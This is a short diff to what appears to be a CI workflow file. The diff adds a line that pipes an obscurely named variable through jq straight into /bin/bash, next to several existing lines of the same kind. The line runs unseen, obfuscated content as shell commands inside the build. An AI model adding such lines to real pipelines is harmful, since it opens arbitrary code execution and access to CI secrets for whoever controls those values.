@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$eo47149" | jq -r .upyvk64461 | /bin/bash
           echo $eb890 | jq -r .wt1068 | /bin/bash
           echo $zw37820 | jq -r .nceed052 | /bin/bash
+          printf '%s' "$cv0338" | jq -r .hkg8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
